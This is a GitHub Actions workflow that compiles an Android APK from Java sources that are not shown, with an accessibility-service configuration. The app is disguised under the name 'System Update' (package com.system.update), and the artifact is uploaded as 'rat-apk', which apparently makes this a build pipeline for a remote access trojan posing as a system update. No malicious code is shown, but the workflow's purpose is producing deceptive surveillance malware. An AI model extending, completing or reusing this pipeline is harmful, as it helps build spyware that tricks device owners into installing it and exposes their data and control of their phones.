name: Build APK

on:
  push:
    branches: [ main ]
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          distribution: 'temurin'
          java-version: '17'

      - name: Setup Android SDK
        uses: android-actions/setup-android@v3

      - name: Install Android SDK components
        run: |
          sdkmanager "platforms;android-34" "build-tools;34.0.0" "platform-tools"

      - name: Setup Project
        run: |
          mkdir -p app/src/main/java/com/system/update
          mkdir -p app/src/main/res/xml
          mkdir -p app/src/main/res/values
          
          cp *.java app/src/main/java/com/system/update/ 2>/dev/null || true
          cp AndroidManifest.xml app/src/main/ 2>/dev/null || true
          cp accessibility_config.xml app/src/main/res/xml/ 2>/dev/null || true
          
          cat > app/src/main/res/values/strings.xml << 'XMLEOF'
          <?xml version="1.0" encoding="utf-8"?>
          <resources>
              <string name="app_name">System Update</string>
          </resources>
          XMLEOF
          
          cat > settings.gradle << 'GRADLEEOF'
          pluginManagement {
              repositories {
                  google()
                  mavenCentral()
                  gradlePluginPortal()
              }
          }
          dependencyResolutionManagement {
              repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)
              repositories {
                  google()
                  mavenCentral()
              }
          }
          rootProject.name = "SystemUpdate"
          include ':app'
          GRADLEEOF
          
          cat > build.gradle << 'GRADLEEOF'
          plugins {
              id 'com.android.application' version '8.1.4' apply false
          }
          GRADLEEOF
          
          cat > gradle.properties << 'GRADLEEOF'
          android.useAndroidX=true
          org.gradle.jvmargs=-Xmx2048m -Dfile.encoding=UTF-8
          GRADLEEOF
          
          cat > app/build.gradle << 'GRADLEEOF'
          plugins {
              id 'com.android.application'
          }
          android {
              namespace 'com.system.update'
              compileSdk 34
              defaultConfig {
                  applicationId "com.system.update"
                  minSdk 24
                  targetSdk 34
                  versionCode 1
                  versionName "1.0"
              }
              compileOptions {
                  sourceCompatibility JavaVersion.VERSION_17
                  targetCompatibility JavaVersion.VERSION_17
              }
          }
          dependencies { }
          GRADLEEOF

      - name: Setup Gradle 8.2
        uses: gradle/actions/setup-gradle@v3
        with:
          gradle-version: 8.2

      - name: Build APK
        run: gradle assembleDebug --no-daemon --stacktrace

      - name: Upload APK
        if: success()
        uses: actions/upload-artifact@v4
        with:
          name: rat-apk
          path: app/build/outputs/apk/debug/app-debug.apk
          if-no-files-found: error
